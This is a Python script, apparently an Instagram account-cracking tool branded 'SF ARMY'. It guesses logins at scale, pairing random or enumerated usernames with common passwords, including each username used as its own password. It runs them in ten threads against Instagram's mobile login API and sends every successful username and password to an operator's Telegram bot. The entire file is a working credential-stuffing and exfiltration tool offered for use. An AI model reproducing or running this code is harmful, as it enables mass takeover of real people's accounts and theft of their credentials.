import random
import sys
import time
from colorama import Fore
from time import sleep
def combo(s):
 for ASU in s + '\n':
  sys.stdout.write(ASU)
  sys.stdout.flush()
  sleep(1. / 1500)
n = '\033[1;35m'
j = '\033[1;36m'
o = '\033[1;31m'
x=j+"""

                  ███████╗  ███████╗    
                  ██╔════╝  ██╔════╝    
                  ███████╗  █████╗  
                  ╚════██║  ██╔══╝  
                  ███████║  ██║     
                  ╚══════╝  ╚═╝     ⠀

  """
combo(x)




import os
try:
	import requests
except:
	os.system('pip install requests')
try:
	import uuid
	from uuid import uuid4
except:
	os.system('pip install uuid')
	import uuid
	from uuid import uuid4
try:
	import random
except:
	os.system('pip install random')
	import random
try:
	import json
except:
	os.system('pip install json')
	import json
try:
	import threading
	from threading import Thread
except:
	os.system('pip install threading')
	import threading
	from threading import Thread
try:
	from user_agent import generate_user_agent
except:
	os.system('pip install user_agent')
	from user_agent import generate_user_agent
try:
	import string
except:
	os.system('pip install string')
	import string
	
	
	
	
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
U = '\x1b[1;37m'#ابیض
A  = '\033[2;34m'#ازرق
Y = '\033[1;34m' #ازرق فاتح
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن

ko = 0
ay = 0
fy = 0


Lo = (f'''{R}            𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 𝐅𝐎𝐑 𝐒𝐅 𝐀𝐑𝐌𝐘 💓🤍✌🏻    ''')
print(Lo)
print('')
import sys
from colorama import Fore, Style, init

init(autoreset=True)

zeus = "FOR_ARMY"

def ares(text):
    return Style.BRIGHT + text + Style.NORMAL

def poseidon(text):
    return '\033[4m' + text + '\033[0m'

print(Fore.CYAN + ares(poseidon("🔒 Secure Script Access")))

hermes = input(Fore.YELLOW + ares("Enter password to run this script: "))

if hermes != zeus:
    print(Fore.RED + ares("❌ Incorrect password. Exiting..."))
    sys.exit(1)

print(Fore.GREEN + ares("✅ Access granted. Running script..."))
print(f'{R} 1 : 4 -𝗟𝗘𝗧𝗧𝗘𝗥 𝗨𝗦𝗘𝗥 ')
print('')
print(f'{Y} 2 : 2010 𝗜𝗡𝗦𝗧𝗔 ')
print('')
print(f'{B} 3 : 2011 𝗜𝗡𝗦𝗧𝗔 ')
print('')
try:
	fi = int(input(f'𝗖𝗛𝗢𝗢𝗦𝗘 𝗔𝗡𝗬  : {X}'))
except:
	exit()

os.system('cls' if os.name == 'nt' else 'clear')
Lo = (f'''{R}𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍     ''')
print(Lo)
print('')
ID = input("𝗘𝗡𝗧𝗘𝗥 𝗜𝗗 : ")
token = str(input(f'𝗧𝗢𝗞𝗘𝗡 : {X}'))
print('')
print('')


def Telegram(user5,ps):
		 et = (f"""
		 𝐇𝐋𝐋𝐋Õ 𝐀𝐑𝐌𝐘 𝐒𝐄𝐍𝐃 𝐀 𝐇𝐈𝐓    
 ⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘ 
		 
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘  :  {user5}
𝗣𝗔𝗦𝗦 : {ps}

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
𝗕𝗬    : @sf_army / @sf_reset""")
	
		 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(et))

	
def login(user5,ps):
	global ko,ay,fy
	
	url = "https://i.instagram.com/api/v1/accounts/login/"
	
	payload = {
            "username": user5,
            "password": ps,
            "device_id": str(uuid.uuid4()),
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_count': '0'
	}

	headers = {
  'User-Agent': "Instagram 113.0.0.39.122 Android (30/11; 320dpi; 720x1339; realme; RMX3261; RMX3261; S19610AA1; en_CA)",
  'Connection': "Keep-Alive",
  'Accept-Encoding': "gzip",
  'Cookie2': "$Version=1",
  'Accept-Language': "en-CA, en-US",
  'X-IG-Connection-Type': "WIFI",
  'X-IG-Capabilities': "AQ==",
  'Cookie': "mid=Z1X1aQABAAEAq4toJ71ehSMDn2Pq; csrftoken=soBcOp1Fev1JzR9iyqMZjlThIjdRZROn"
}

	res = requests.post(url, data=payload, headers=headers).text
	

	
	if 'checkpoint_challenge_required' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		ko += 1
		Lo = (f'''
𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍      
           
           
           {F}𝗛𝗜𝗧𝗦 ~ {ko}  {X}𝗚𝗢𝗢𝗗{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦{ay}
		''')
		print(Lo)
		Telegram(user5,ps)
	elif 'logged_in_user' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		ko += 1
		Lo = (f'''

           𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍     
          
           
           {F}𝗛𝗜𝗧𝗦 :{ko}  {X}𝗚𝗢𝗢𝗗 :{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦 : {ay}
		''')
		print(Lo)
		Telegram(user5,ps)
	elif 'logout' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		ko += 1
		Lo = (f'''


           𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍     
           
           
           {F}𝗛𝗜𝗧𝗦 :{ko}  {X}𝗚𝗢𝗢𝗗 :{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦 : {ay}
		''')
		print(Lo)
		Telegram(user5,ps)
	elif 'years old to have an account' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		fy += 1
		Lo = (f'''


           𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍      
           
           
          {F}𝗛𝗜𝗧𝗦 :{ko}  {X}𝗚𝗢𝗢𝗗 :{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦 : {ay}
		''')
		print(Lo)
		Telegram(user5,ps)
	elif 'UserInvalidCredentials' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		ay += 1
		Lo = (f'''


           𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍      
           
           
           {F}𝗛𝗜𝗧𝗦 :{ko}  {X}𝗚𝗢𝗢𝗗 :{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦 : {ay}
		''')
		print(Lo)
	elif 'bad_password' in res:
		os.system('cls' if os.name == 'nt' else 'clear')
		ay += 1
		Lo = (f'''


           𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐁𝐘 𝐒𝐅 💓🤍      
           
           
           {F}𝗛𝗜𝗧𝗦 :{ko}  {X}𝗚𝗢𝗢𝗗 :{fy}  {Z}𝗖𝗛𝗘𝗖𝗞𝗦 : {ay}
		''')
		print(Lo)
	else:
		os.system('cls' if os.name == 'nt' else 'clear')
		print('𝐂𝐇𝐄𝐂𝐊 𝐕𝐏𝐍 𝐀𝐍𝐃 𝐍𝐄𝐓𝐖𝐎𝐑𝐊')
	
def ranbom():
			
			while True:
				pl = 'qwertyuiopasdfghjklzxcvbnm1234567890'
				u = random.choice(pl)
				s = random.choice(pl)
				r  = random.choice(pl)
				e = random.choice(pl)
				user = u+s+r+e
				user1 = u+r+e+s
				user2 = u+u+s+r
				user3 = u+e+s+r
				user4 = (user,user1,user2,user3)
				user5 = random.choice(user4)
				pasworsd = ('Aa123123','Aa112233','zzxxccvv','qazxcvbnm','qwer1234','qwert12345','aassddff','112233445566','12341234')
				ps = random.choice(pasworsd)
				login(user5,ps)



def harth():
	    while True:
	            lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
	            id = str(random.randrange(10000,17750000))
	            headers = {
	                'accept': '*/*',
	                'accept-language': 'en-US,en;q=0.9',
	                'content-type': 'application/x-www-form-urlencoded',
	                'origin': 'https://www.instagram.com',
	                'referer': 'https://www.instagram.com/0s9s/',
	                'user-agent': 'Instagram 113.0.0.39.122 Android', 
	                'x-fb-lsd': 'insta' + lsd,
	            }
	            data = {
	                'lsd': 'insta' + lsd,
	                'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
	                'doc_id': '7397388303713986',
	            }
	            
	            
	
	            try:
		            user5 = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
		            
		            ps = user5
				            
		            if '_' in user5:
		              continue
		            else:
		            	login(user5,ps)
	            except:
	            	harth()

def zaid():
	    while True:
	            lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
	            id = str(random.randrange(10000,1279000))
	            headers = {
	                'accept': '*/*',
	                'accept-language': 'en-US,en;q=0.9',
	                'content-type': 'application/x-www-form-urlencoded',
	                'origin': 'https://www.instagram.com',
	                'referer': 'https://www.instagram.com/0s9s/',
	                'user-agent': 'Instagram 113.0.0.39.122 Android', 
	                'x-fb-lsd': 'insta' + lsd,
	            }
	            data = {
	                'lsd': 'insta' + lsd,
	                'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
	                'doc_id': '7397388303713986',
	            }
	            
	            
	
	            try:
		            user5 = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
		            
		            ps = user5
				            
		            if '_' in user5:
		              continue
		            else:
		            	login(user5,ps)
	            except:
	            	zaid()
	 
	 
if fi==1:
	threads = []
	for _ in range(10):
		    thread = Thread(target=ranbom)
		    thread.start()
		    threads.append(thread)
		
	for thread in threads:
		    thread.join()
elif fi == 2:
	threads = []
	for _ in range(10):
		    thread = Thread(target=zaid)
		    thread.start()
		    threads.append(thread)
		
	for thread in threads:
		    thread.join()
elif fi == 3:
	threads = []
	for _ in range(10):
		    thread = Thread(target=harth)
		    thread.start()
		    threads.append(thread)
		
	for thread in threads:
		    thread.join()
else:
	print('Bad')